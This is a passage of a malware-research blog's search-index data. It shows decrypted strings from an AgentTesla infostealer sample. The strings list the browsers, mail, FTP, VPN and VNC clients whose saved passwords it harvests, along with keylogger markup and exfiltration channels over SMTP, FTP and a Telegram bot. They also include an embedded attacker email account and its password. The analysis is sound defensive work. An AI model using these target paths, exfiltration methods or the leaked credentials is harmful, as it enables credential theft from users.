b&#39;CO&#39;, b&#39;CO_&#39;, b&#39;-&#39;, b&#39;_&#39;, b&#39;.zip&#39;, b&#39; &#39;, b&#39;yyyy-MM-dd hh-mm-ss&#39;, b&#39;Cookie&#39;, b&#39;application/zip&#39;, b&#39;SC&#39;, b&#39;SC_&#39;, b&#39;.jpeg&#39;, b&#39;Screenshot&#39;, b&#39;image/jpeg&#39;, b&#39;/log.tmp&#39;, b&#39;KL&#39;, b&#39;KL_&#39;, b&#39;.html&#39;, b&#39;&lt;html&gt;&#39;, b&#39;&lt;/html&gt;&#39;, b&#39;Log&#39;, b&#39;text/html&#39;, b&#39;[&#39;, b&#39;]&#39;, b&#39;Time: &#39;, b&#39;MM/dd/yyyy HH:mm:ss&#39;, b&#39;User Name: &#39;, b&#39;Computer Name: &#39;, b&#39;OSFullName: &#39;, b&#39;CPU: &#39;, b&#39;RAM: &#39;, b&#39;IP Address: &#39;, b&#39;New &#39;, b&#39; Recovered!&#39;, b&#39;User Name&#39;, b&#39;: &#39;, b&#39;OSFullName&#39;, b&#39;uninstall&#39;, b&#39;Software Microsoft Windows NT CurrentVersion Windows&#39;, b&#39;Load&#39;, b&#39;%ftphost%/&#39;, b&#39;%ftpuser%&#39;, b&#39;%ftppassword%&#39;, b&#39;STOR&#39;, b&#39;Length&#39;, b&#39;Write&#39;, b&#39;Close&#39;, b&#39;GetBytes&#39;, b&#39;Opera Browser&#39;, b&#39;Opera Software Opera Stable&#39;, b&#39;Yandex Browser&#39;, b&#39;Yandex YandexBrowser User Data&#39;, b&#39;Iridium Browser&#39;, b&#39;Iridium User Data&#39;, b&#39;Chromium&#39;, b&#39;Chromium User Data&#39;, b&#39;7Star&#39;, b&#39;7Star 7Star User Data&#39;, b&#39;Torch Browser&#39;, b&#39;Torch User Data&#39;, b&#39;Cool Novo&#39;, b&#39;MapleStudio ChromePlus User Data&#39;, b&#39;Kometa&#39;, b&#39;Kometa User Data&#39;, b&#39;Amigo&#39;, b&#39;Amigo User Data&#39;, b&#39;Brave&#39;, b&#39;BraveSoftware Brave-Browser User Data&#39;, b&#39;CentBrowser&#39;, b&#39;CentBrowser User Data&#39;, b&#39;Chedot&#39;, b&#39;Chedot User Data&#39;, b&#39;Orbitum&#39;, b&#39;Orbitum User Data&#39;, b&#39;Sputnik&#39;, b&#39;Sputnik Sputnik User Data&#39;, b&#39;Comodo Dragon&#39;, b&#39;Comodo Dragon User Data&#39;, b&#39;Vivaldi&#39;, b&#39;Vivaldi User Data&#39;, b&#39;Citrio&#39;, b&#39;CatalinaGroup Citrio User Data&#39;, b&#39;360 Browser&#39;, b&#39;360Chrome Chrome User Data&#39;, b&#39;Uran&#39;, b&#39;uCozMedia Uran User Data&#39;, b&#39;Liebao Browser&#39;, b&#39;liebao User Data&#39;, b&#39;Elements Browser&#39;, b&#39;Elements Browser User Data&#39;, b&#39;Epic Privacy&#39;, b&#39;Epic Privacy Browser User Data&#39;, b&#39;Coccoc&#39;, b&#39;CocCoc Browser User Data&#39;, b&#39;Sleipnir 6&#39;, b&#39;Fenrir Inc Sleipnir5 setting modules ChromiumViewer&#39;, b&#39;QIP Surf&#39;, b&#39;QIP Surf User Data&#39;, b&#39;Coowon&#39;, b&#39;Coowon Coowon User Data&#39;, b&#39;APPDATA&#39;, b&#39; CoreFTP sites.idx&#39;, b&#39;HKEY_CURRENT_USER Software FTPWare COREFTP Sites &#39;, b&#39;Host&#39;, b&#39;HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites&#39;, b&#39;Port&#39;, b&#39;User&#39;, b&#39;PW&#39;, b&#39;CoreFTP&#39;, b&#39;webpanel&#39;, b&#39;,&#39;, b&#39;&#34;&#39;, b&#39;smtp&#39;, b&#39;ftp&#39;, b&#39;URL: &#39;, b&#39;Username: &#39;, b&#39;Password: &#39;, b&#39;Application: &#39;, b&#39;URL:&#39;, b&#39;Username:&#39;, b&#39;Password:&#39;, b&#39;Application:&#39;, b&#39;PW_&#39;, b&#39; x00&#39;, b&#39;kcchdeal@jubana.cam&#39;, b&#39;3_sdYb:Q@pq5&#39;, b&#39;smtp.jubana.cam&#39;, b&#39;kcchdealrrrr@jubana.cam&#39;, b&#39;image/jpg&#39;, b&#39;:Zone.Identifier&#39;, b&#39; tmpG&#39;, b&#39;.tmp&#39;, b&#39;%urlkey%&#39;, b&#39;-f &#39;, b&#39; Data Tor torrc&#39;, b&#39;p=&#39;, b&#39;%PostURL%&#39;, b&#39;127.0.0.1&#39;, b&#39;POST&#39;, b&#39;+&#39;, b&#39;%2B&#39;, b&#39;application/x-www-form-urlencoded&#39;, b&#39;&amp;&#39;, b&#39;&amp;amp;&#39;, b&#39;&lt;&#39;, b&#39;&amp;lt;&#39;, b&#39;&gt;&#39;, b&#39;&amp;gt;&#39;, b&#39;&amp;quot;&#39;, b&#39;Copied Text: &#39;, b&#39;&lt;font color=&#34;#00b1ba&#34;&gt;&lt;b&gt;[ &#39;, b&#39;&lt;/b&gt;&#39;, b&#39; &lt;b&gt;]&lt;/b&gt; &lt;font color=&#34;#000000&#34;&gt;(&#39;, b&#39;)&lt;/font&gt;&lt;/font&gt;&#39;, b&#39;False&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{BACK}&lt;/font&gt;&#39;, b&#39;&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{ALT+TAB}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{ALT+F4}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{TAB}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{ESC}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{Win}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{CAPSLOCK}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;&amp;uarr;&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;&amp;darr;&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;&amp;larr;&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;&amp;rarr;&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{DEL}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{END}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{HOME}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{Insert}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{NumLock}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{PageDown}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{PageUp}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{ENTER}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F1}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F2}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F3}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F4}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F5}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F6}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F7}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F8}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F9}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F10}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F11}&lt;/font&gt;&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{F12}&lt;/font&gt;&#39;, b&#39;control&#39;, b&#39;&lt;font color=&#34;#00ba66&#34;&gt;{CTRL}&lt;/font&gt;&#39;, b&#39;Windows RDP&#39;, b&#39;credential&#39;, b&#39;policy&#39;, b&#39;blob&#39;, b&#39;rdg&#39;, b&#39;chrome&#39;, b&#39;{{{0}}}&#39;, b&#39;CopyTo&#39;, b&#39;ComputeHash&#39;, b&#39;sha512&#39;, b&#39;Copy&#39;, b&#39;SystemDrive&#39;, b&#39; &#39;, b&#39;WScript.Shell&#39;, b&#39;RegRead&#39;, b&#39;g&#39;, b&#39;401 r n r n&#39;, b&#39;502 &#39;, b&#39; r n r n&#39;, b&#39;500 &#39;, b&#39;Add&#39;, b&#39;chat_id&#39;, b&#39;caption&#39;, b&#39;/sendDocument&#39;, b&#39;document&#39;, b&#39;&#39;, b&#39;x&#39;, b&#39; r n--&#39;, b&#39; r n&#39;, b&#39;multipart/form-data; boundary=&#39;, b&#39;Content-Disposition: form-data; name=&#34;{0}&#34; r n r n{1}&#39;, b&#39;Content-Disposition: form-data; name=&#34;{0}&#34;; filename=&#34;{1}&#34; r nContent-Type: {2} r n r n&#39;, b&#39;-- r n&#39;, b&#39;Cookies&#39;, b&#39;Opera&#39;, b&#39;Chrome&#39;, b&#39; Google Chrome User Data&#39;, b&#39; 360Chrome Chrome User Data&#39;, b&#39;Yandex&#39;, b&#39;SRWare Iron&#39;, b&#39;Brave Browser&#39;, b&#39; Iridium User Data&#39;, b&#39;CoolNovo&#39;, b&#39;Epic Privacy Browser&#39;, b&#39;CocCoc&#39;, b&#39;QQ Browser&#39;, b&#39;Tencent QQBrowser User Data&#39;, b&#39;UC Browser&#39;, b&#39;UCBrowser &#39;, b&#39;uCozMedia&#39;, b&#39;cookies.sqlite&#39;, b&#39;Firefox&#39;, b&#39; Mozilla Firefox &#39;, b&#39;IceCat&#39;, b&#39; Mozilla icecat &#39;, b&#39;PaleMoon&#39;, b&#39; Moonchild Productions Pale Moon &#39;, b&#39;SeaMonkey&#39;, b&#39; Mozilla SeaMonkey &#39;, b&#39;Flock&#39;, b&#39; Flock Browser &#39;, b&#39;K-Meleon&#39;, b&#39; K-Meleon &#39;, b&#39;Postbox&#39;, b&#39; Postbox &#39;, b&#39;Thunderbird&#39;, b&#39; Thunderbird &#39;, b&#39;IceDragon&#39;, b&#39; Comodo IceDragon &#39;, b&#39;WaterFox&#39;, b&#39; Waterfox &#39;, b&#39;BlackHawk&#39;, b&#39; NETGATE Technologies BlackHawk &#39;, b&#39;CyberFox&#39;, b&#39; 8pecxstudios Cyberfox &#39;, b&#39;Path=([A-z0-9 / . -]+)&#39;, b&#39;profiles.ini&#39;, b&#39; Default &#39;, b&#39;Profile&#39;, b&#39;origin_url&#39;, b&#39;username_value&#39;, b&#39;password_value&#39;, b&#39;v10&#39;, b&#39;v11&#39;, b&#39;Opera Stable&#39;, b&#39; Local State&#39;, b&#39;&#34;encrypted_key&#34;:&#34;(.*?)&#34;&#39;, b&#39; Default Login Data&#39;, b&#39; Login Data&#39;, b&#39; Google Chrome User Data &#39;, b&#39;logins&#39;, b&#39;Major&#39;, b&#39;Minor&#39;, b&#39;2F1A6504-0641-44CF-8BB5-3612D865F2E5&#39;, b&#39;Windows Secure Note&#39;, b&#39;3CCD5499-87A8-4B10-A215-608888DD3B55&#39;, b&#39;Windows Web Password Credential&#39;, b&#39;154E23D0-C644-4E6F-8CE6-5069272F999F&#39;, b&#39;Windows Credential Picker Protector&#39;, b&#39;4BF4C442-9B8A-41A0-B380-DD4A704DDB28&#39;, b&#39;Web Credentials&#39;, b&#39;77BC582B-F0A6-4E15-4E80-61736B6F3B29&#39;, b&#39;Windows Credentials&#39;, b&#39;E69D7838-91B5-4FC9-89D5-230D4D4CC2BC&#39;, b&#39;Windows Domain Certificate Credential&#39;, b&#39;3E0E35BE-1B77-43E7-B873-AED901B6275B&#39;, b&#39;Windows Domain Password Credential&#39;, b&#39;3C886FF3-2669-4AA2-A8FB-3F6759A77548&#39;, b&#39;Windows Extended Credential&#39;, b&#39;00000000-0000-0000-0000-000000000000&#39;, b&#39;SchemaId&#39;, b&#39;pResourceElement&#39;, b&#39;pIdentityElement&#39;, b&#39;pPackageSid&#39;, b&#39;pAuthenticatorElement&#39;, b&#39;IE/Edge&#39;, b&#39;Type&#39;, b&#39;Value&#39;, b&#39; Common Files Apple Apple Application Support plutil.exe&#39;, b&#39; Apple Computer Preferences keychain.plist&#39;, b&#39;*&#39;, b&#39;Login Data&#39;, b&#39;journal&#39;, b&#39;wow_logins&#39;, b&#39; Microsoft Edge User Data&#39;, b&#39;Edge Chromium&#39;, b&#39; Microsoft Credentials &#39;, b&#39; Microsoft Protect &#39;, b&#39;GuidMasterKey&#39;, b&#39; Default EncryptedStorage&#39;, b&#39; EncryptedStorage&#39;, b&#39;entries&#39;, b&#39;category&#39;, b&#39;Password&#39;, b&#39;str3&#39;, b&#39;str2&#39;, b&#39;blob0&#39;, b&#39;PopPassword&#39;, b&#39;SmtpPassword&#39;, b&#39;Software IncrediMail Identities &#39;, b&#39; Accounts_New&#39;, b&#39;EmailAddress&#39;, b&#39;SmtpServer&#39;, b&#39;incredimail&#39;, b&#39;HKEY_CURRENT_USER Software Qualcomm Eudora CommandLine&#39;, b&#39;current&#39;, b&#39;Settings&#39;, b&#39;SavePasswordText&#39;, b&#39;ReturnAddress&#39;, b&#39;Eudora&#39;, b&#39; falkon profiles &#39;, b&#39;startProfile=&#34;([A-z0-9 / .]+)&#34;&#39;, b&#39; browsedata.db&#39;, b&#39;autofill&#39;, b&#39;Falkon Browser&#39;, b&#39;startProfile=([A-z0-9 / .]+)&#39;, b&#39;Backend=([A-z0-9 / .-]+)&#39;, b&#39; settings.ini&#39;, b&#39; Claws-mail&#39;, b&#39; clawsrc&#39;, b&#39;passkey0&#39;, b&#39;master_passphrase_salt=(.+)&#39;, b&#39;master_passphrase_pbkdf2_rounds=(.+)&#39;, b&#39;use_master_passphrase=(.+)&#39;, b&#39; accountrc&#39;, b&#39;smtp_server&#39;, b&#39;address&#39;, b&#39;account&#39;, b&#39; passwordstorerc&#39;, b&#39;{(.*),(.*)}(.*)&#39;, b&#39;ClawsMail&#39;, b&#39;TransformFinalBlock&#39;, b&#39;Substring&#39;, b&#39;IterationCount&#39;, b&#39;signons3.txt&#39;, b&#39;&#39;, b&#39; r n. r n&#39;, b&#39;objects&#39;, b&#39;Data&#39;, b&#39;DecryptTripleDes&#39;, b&#39;Flock Browser&#39;, b&#39;ALLUSERSPROFILE&#39;, b&#39; &#39;, b&#39;DynDNS Updater config.dyndns&#39;, b&#39;username=&#39;, b&#39;=&#39;, b&#39;password=&#39;, b&#39;&amp;H&#39;, b&#39;t6KzXhCh&#39;, b&#39;http://DynDns.com&#39;, b&#39;DynDNS&#39;, b&#39; Psi profiles&#39;, b&#39; Psi+ profiles&#39;, b&#39; accounts.xml&#39;, b&#39;name&#39;, b&#39;jid&#39;, b&#39;password&#39;, b&#39;Psi/Psi+&#39;, b&#39;Software OpenVPN-GUI configs&#39;, b&#39;Software OpenVPN-GUI configs &#39;, b&#39;username&#39;, b&#39;auth-data&#39;, b&#39;entropy&#39;, b&#39;Open VPN&#39;, b&#39;USERPROFILE&#39;, b&#39; OpenVPN config &#39;, b&#39;remote &#39;, b&#39; FileZilla recentservers.xml&#39;, b&#39;&lt;Server&gt;&#39;, b&#39;&lt;Host&gt;&#39;, b&#39;&lt;/Host&gt;&#39;, b&#39;:&#39;, b&#39;&lt;Port&gt;&#39;, b&#39;&lt;/Port&gt;&#39;, b&#39;&lt;User&gt;&#39;, b&#39;&lt;/User&gt;&#39;, b&#39;&lt;Pass encoding=&#34;base64&#34;&gt;&#39;, b&#39;&lt;/Pass&gt;&#39;, b&#39;&lt;Pass&gt;&#39;, b&#39;FileZilla&#39;, b&#39;SOFTWARE Martin Prikryl WinSCP 2 Sessions&#39;, b&#39;HostName&#39;, b&#39;UserName&#39;, b&#39;PublicKeyFile&#39;, b&#39;PortNumber&#39;, b&#39;22&#39;, b&#39;[PRIVATE KEY LOCATION: &#34;{0}&#34;]&#39;, b&#39;WinSCP&#39;, b&#39;Username&#39;, b&#39;All Users&#39;, b&#39; FlashFXP 3quick.dat&#39;, b&#39;IP=&#39;, b&#39;port=&#39;, b&#39;user=&#39;, b&#39;pass=&#39;, b&#39;created=&#39;, b&#39;FlashFXP&#39;, b&#39; FTP Navigator Ftplist.txt&#39;, b&#39;Server&#39;, b&#39;No Password&#39;, b&#39;FTP Navigator&#39;, b&#39;Programfiles(x86)&#39;, b&#39;programfiles&#39;, b&#39; jDownloader config database.script&#39;, b&#39;programfiles(x86)&#39;, b&#34;INSERT INTO CONFIG VALUES(&#39;AccountController&#39;,&#39;&#34;, b&#39;sq&#39;, b&#39;.&#39;, b&#39;t&#39;, b&#39;xt&#39;, b&#39;JDownloader&#39;, b&#39;Software Paltalk&#39;, b&#39;HKEY_CURRENT_USER Software Paltalk &#39;, b&#39;pwd&#39;, b&#39;Paltalk&#39;, b&#39; .purple accounts.xml&#39;, b&#39;&lt;account&gt;&#39;, b&#39;&lt;protocol&gt;&#39;, b&#39;&lt;/protocol&gt;&#39;, b&#39;&lt;name&gt;&#39;, b&#39;&lt;/name&gt;&#39;, b&#39;&lt;password&gt;&#39;, b&#39;&lt;/password&gt;&#39;, b&#39;Pidgin&#39;, b&#39; SmartFTP Client 2.0 Favorites Quick Connect &#39;, b&#39; SmartFTP Client 2.0 Favorites Quick Connect *.xml&#39;, b&#39;&lt;Password&gt;&#39;, b&#39;&lt;/Password&gt;&#39;, b&#39;&lt;Name&gt;&#39;, b&#39;&lt;/Name&gt;&#39;, b&#39;SmartFTP&#39;, b&#39;appdata&#39;, b&#39; Ipswitch WS_FTP Sites ws_ftp.ini&#39;, b&#39;HOST&#39;, b&#39;UID&#39;, b&#39;PWD&#39;, b&#39;WS_FTP&#39;, b&#39;PWD=&#39;, b&#39;Key&#39;, b&#39;Mode&#39;, b&#39;IV&#39;, b&#39;Padding&#39;, b&#39;CreateDecryptor&#39;, b&#39; cftp Ftplist.txt&#39;, b&#39;;Server=&#39;, b&#39;;Port=&#39;, b&#39;;Password=&#39;, b&#39;;User=&#39;, b&#39;;Anonymous=&#39;, b&#39;Name=&#39;, b&#39;FTPCommander&#39;, b&#39; FTPGetter servers.xml&#39;, b&#39;&lt;server&gt;&#39;, b&#39;&lt;server_ip&gt;&#39;, b&#39;&lt;/server_ip&gt;&#39;, b&#39;&lt;server_port&gt;&#39;, b&#39;&lt;/server_port&gt;&#39;, b&#39;&lt;server_user_name&gt;&#39;, b&#39;&lt;/server_user_name&gt;&#39;, b&#39;&lt;server_user_password&gt;&#39;, b&#39;&lt;/server_user_password&gt;&#39;, b&#39;FTPGetter&#39;, b&#39;HKEY_LOCAL_MACHINE SOFTWARE Vitalwerks DUC&#39;, b&#39;HKEY_CURRENT_USER SOFTWARE Vitalwerks DUC&#39;, b&#39;USERname&#39;, b&#39;NO-IP&#39;, b&#39;+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;, b&#39; The Bat!&#39;, b&#39; Account.CFN&#39;, b&#39;zzz&#39;, b&#39; x00 x00 x00&#39;, b&#39;TheBat&#39;, b&#39;HKEY_CURRENT_USER Software RimArts B2 Settings&#39;, b&#39;DataDir&#39;, b&#39;Folder.lst&#39;, b&#39; Mailbox.ini&#39;, b&#39;Account&#39;, b&#39;SMTPServer&#39;, b&#39;MailAddress&#39;, b&#39;PassWd&#39;, b&#39;Becky!&#39;, b&#39; Trillian users global accounts.dat&#39;, b&#39;Accounts&#39;, b&#39;Trillian&#39;, b&#39;Software Microsoft Office 15.0 Outlook Profiles Outlook 9375CFF0413111d3B88A00104B2A6676&#39;, b&#39;Software Microsoft Windows NT CurrentVersion Windows Messaging Subsystem Profiles Outlook 9375CFF0413111d3B88A00104B2A6676&#39;, b&#39;Software Microsoft Windows Messaging Subsystem Profiles 9375CFF0413111d3B88A00104B2A6676&#39;, b&#39;Software Microsoft Office 16.0 Outlook Profiles Outlook 9375CFF0413111d3B88A00104B2A6676&#39;, b&#39;Email&#39;, b&#39;IMAP Password&#39;, b&#39;POP3 Password&#39;, b&#39;HTTP Password&#39;, b&#39;SMTP Password&#39;, b&#39;SMTP Server&#39;, b&#39;Outlook&#39;, b&#39;HKEY_CURRENT_USER Software Aerofox FoxmailPreview&#39;, b&#39;Executable&#39;, b&#39;HKEY_CURRENT_USER Software Aerofox Foxmail V3.1&#39;, b&#39;FoxmailPath&#39;, b&#39; Storage &#39;, b&#39; mail &#39;, b&#39; VirtualStore Program Files Foxmail mail &#39;, b&#39; VirtualStore Program Files (x86) Foxmail mail &#39;, b&#39; Accounts Account.rec0&#39;, b&#39; Account.stg&#39;, b&#39;Read&#39;, b&#39;Dispose&#39;, b&#39;POP3Host&#39;, b&#39;SMTPHost&#39;, b&#39;IncomingServer&#39;, b&#39;POP3Password&#39;, b&#39;Foxmail&#39;, b&#39;5A&#39;, b&#39;71&#39;, b&#39; Opera Mail Opera Mail wand.dat&#39;, b&#39;opera:&#39;, b&#39;Opera Mail&#39;, b&#34;abc xc3 xa7defg xc4 x9fh xc4 xb1ijklmno xc3 xb6pqrs xc5 x9ftu xc3 xbcvwxyz1234567890_-.~!@#$%^&amp;*()[{]} |&#39;;:,&lt;&gt;/?+= r n &#34;, b&#39; Pocomail accounts.ini&#39;, b&#39;POPPass&#39;, b&#39;SMTPPass&#39;, b&#39;SMTP&#39;, b&#39;PocoMail&#39;, b&#39;RealVNC 4.x&#39;, b&#39;SOFTWARE Wow6432Node RealVNC WinVNC4&#39;, b&#39;RealVNC 3.x&#39;, b&#39;SOFTWARE RealVNC vncserver&#39;, b&#39;SOFTWARE RealVNC WinVNC4&#39;, b&#39;Software ORL WinVNC3&#39;, b&#39;TightVNC&#39;, b&#39;Software TightVNC Server&#39;, b&#39;PasswordViewOnly&#39;, b&#39;TightVNC ControlPassword&#39;, b&#39;ControlPassword&#39;, b&#39;TigerVNC&#39;, b&#39;Software TigerVNC Server&#39;, b&#39;Trim&#39;, b&#39;UltraVNC&#39;, b&#39;ProgramFiles(x86)&#39;, b&#39; uvnc bvba UltraVNC ultravnc.ini&#39;, b&#39;passwd&#39;, b&#39;passwd2&#39;, b&#39;ProgramFiles&#39;, b&#39; UltraVNC ultravnc.ini&#39;, b&#39; r&#39;, b&#39; n&#39;, b&#39; eM Client&#39;, b&#39;.dll&#39;, b&#39;eM Client accounts.dat&#39;, b&#39;eM Client&#39;, b&#39;AccountConfiguration&#39;, b&#39;72905C47-F4FD-4CF7-A489-4E8121A155BD&#39;, b&#39;host&#39;, b&#39;o6806642kbM7c5&#39;, b&#39; Mailbird Store Store.db&#39;, b&#39;Server_Host&#39;, b&#39;EncryptedPassword&#39;, b&#39;Mailbird&#39;, b&#39;SenderIdentities&#39;, b&#39;NordVPN&#39;, b&#39;NordVPN directory not found!&#39;, b&#39;NordVpn.exe*&#39;, b&#39;user.config&#39;, b&#39;SelectSingleNode&#39;, b&#34;//setting[@name=&#39;Username&#39;]/value&#34;, b&#39;InnerText&#39;, b&#34;//setting[@name=&#39;Password&#39;]/value&#34;, b&#39; MySQL Workbench workbench_user_data.dat&#39;, b&#39; x02&#39;, b&#39; x03&#39;, b&#39;MySQL Workbench&#39;, b&#39;%ProgramW6432%&#39;, b&#39;Private Internet Access data&#39;, b&#39; Private Internet Access data&#39;, b&#39; account.json&#39;, b&#39;.*&#34;username&#34;:&#34;(.*?)&#34;&#39;, b&#39;.*&#34;password&#34;:&#34;(.*?)&#34;&#39;, b&#39;Private Internet Access&#39;, b&#39;&lt;array&gt;&#39;, b&#39;&lt;dict&gt;&#39;, b&#39;&lt;string&gt;&#39;, b&#39;&lt;/string&gt;&#39;, b&#39;&lt;data&gt;&#39;, b&#39;&lt;/data&gt;&#39;, b&#39;Safari Browser&#39;, b&#39; -convert xml1 -s -o &#34;&#39;, b&#39; fixed_keychain.xml&#34; &#39;, b&#39;A&#39;, b&#39;10&#39;, b&#39;B&#39;, b&#39;11&#39;, b&#39;C&#39;, b&#39;12&#39;, b&#39;D&#39;, b&#39;13&#39;, b&#39;E&#39;, b&#39;14&#39;, b&#39;F&#39;, b&#39;15&#39;, b&#39;ABCDEF&#39;, b&#39;(&#39;, b&#39;EndsWith&#39;, b&#39;)&#39;, b&#39;IndexOf&#39;, b&#39;UNIQUE&#39;, b&#39;table&#39;, b&#39;Software DownloadManager Passwords &#39;, b&#39;EncPassword&#39;, b&#39;Internet Download Manager&#39;, b&#39;{0}&#39;, b&#39;http://127.0.0.1:&#39;, b&#39;HTTP/1.1 &#39;, b&#39;Hostname&#39;, b&#39;200 Connection established r nProxy-Agent: HToS5x r n r n&#39;, b&#39;Connect&#39;, b&#39;PathAndQuery&#39;, b&#39;Fragment&#39;, b&#39; r nHost: &#39;, b&#39;Wr&#39;, b&#39;W&#39;, b&#39;ExtractFile&#39;, b&#39;n&#39;, b&#39;Tor&#39;, b&#39;AUTHENTICATE &#34;%torpass%&#34;&#39;, b&#39;SIGNAL NEWNYM&#39;, b&#39;250&#39;, b&#39;tor&#39;, b&#39;StartInfo&#39;, b&#39;FileName&#39;, b&#39; Tor tor.exe&#39;, b&#39;Arguments&#39;, b&#39;UseShellExecute&#39;, b&#39;RedirectStandardOutput&#39;, b&#39;CreateNoWindow&#39;, b&#39;Start&#39;, b&#39;StandardOutput&#39;, b&#39;ReadLine&#39;, b&#39;Contains&#39;, b&#39;Bootstrapped 100%&#39;, b&#39;EndOfStream&#39;, b&#39;Id&#39;, b&#39;AvoidDiskWrites 1 r nLog notice stdout r nDormantCanceledByStartup 1 r nControlPort 9051 r nCookieAuthentication 1 r nrunasdaemon 1 r nExtORPort auto r nhashedcontrolpassword %hash% r nDataDirectory %tordir% Data Tor r nGeoIPFile %tordir% Data Tor geoip r nGeoIPv6File %tordir% Data Tor geoip6 r n&#39;, b&#39; tor.zip&#39;, b&#39;https://www.theonionrouter.com/dist.torproject.org/torbrowser/9.5.3/tor-win32-0.4.3.6.zip&#39;, b&#39;%tordir%&#39;, b&#39;%hash%&#39;, b&#39;%torpass%&#39;, b&#39;https://www.theonionrouter.com/dist.torproject.org/torbrowser/&#39;, b&#39;&lt;a.+?href s*= s*([&#34; &#39;])(?&lt;href&gt;.+?) 1[^&gt;]*&gt;&#39;, b&#39;href&#39;, b&#39;Replace&#39;, b&#39;TrimStart&#39;, b&#39;TrimEnd&#39;, b&#39;tor-win32-&#39;, b&#39;TransformBlock&#39;, b&#39;Hash&#39;, b&#39;16:&#39;, b&#39;None&#39;, b&#39;win32_processor&#39;, b&#39;processorID&#39;, b&#39;076343ad-49fa-41e5-b7b9-ec7c667b3e14&#39;, b&#39;Win32_NetworkAdapterConfiguration&#39;, b&#39;IPEnabled&#39;, b&#39;MacAddress&#39;, b&#39;e436286e-22df-4cd6-96d1-470b765682b1&#39;, b&#39;WinMgmts:&#39;, b&#39;InstancesOf&#39;, b&#39;Win32_BaseBoard&#39;, b&#39;SerialNumber&#39;, b&#39;356d6f2c-400a-4f1c-9d19-779919dea534&#39;, b&#39;x2&#39;, b&#39;00061561&#39;, b&#39;Berkelet DB&#39;, b&#39;00000002&#39;, b&#39; 1.85 (Hash, version 2, native byte-order)&#39;, b&#39;Unknow database format&#39;, b&#39;SEQUENCE {&#39;, b&#39;{0:X2}&#39;, b&#39; tINTEGER &#39;, b&#39; tOCTETSTRING &#39;, b&#39; tOBJECTIDENTIFIER &#39;, b&#39;}&#39;, b&#39;sha256&#39;, b&#39;key4.db&#39;, b&#39;metaData&#39;, b&#39;id&#39;, b&#39;item1&#39;, b&#39;item2&#39;, b&#39;nssPrivate&#39;, b&#39;a11&#39;, b&#39;a102&#39;, b&#39;2a864886f70d0209&#39;, b&#39;2a864886f70d010c050103&#39;, b&#39;key3.db&#39;, b&#39;global-salt&#39;, b&#39;Version&#39;, b&#39;password-check&#39;, b&#39;logins.json&#39;, b&#39; &#34;(hostname|encryptedPassword|encryptedUsername)&#34;:&#34;(.*?)&#34;&#39;, b&#39;[^ u0020- u007F]&#39;, b&#39;signons.sqlite&#39;, b&#39;moz_logins&#39;, b&#39;hostname&#39;, b&#39;encryptedUsername&#39;, b&#39;encryptedPassword&#39;, b&#39;Version=4.0.0.0&#39;, b&#39;version=2.0.0.0&#39;, b&#39;mscorlib&#39;, b&#39;System&#39;, b&#39;MailClient.Protocols.Smtp.SmtpAccountConfiguration&#39;, b&#39;MailClient.Accounts.TlsType&#39;, b&#39;MailClient.Accounts.CredentialsModelTypes&#39;, b&#39;MailClient.Accounts.Mail.MailAccountConfiguration&#39;, b&#39;MailClient.Accounts.ArchivingScope&#39;, b&#39;MailClient.Mail.MailAddress&#39;, b&#39;;&#39;, b&#39;info&#39;, b&#39;AccountConfiguration+accountName&#39;, b&#39;AccountConfiguration+username&#39;, b&#39;AccountConfiguration+password&#39;, b&#39;providerName&#39;] .",
            "url": "https://research.openanalysis.net/dotnet/python/agenttesla/research/2022/11/17/agenttesla.html",
            "relUrl": "/dotnet/python/agenttesla/research/2022/11/17/agenttesla.html",
            "date": " ‚Ä¢ Nov 17, 2022"
        }
        
    
  
    
        ,"post31": {
            "title": "Amadey Loader",
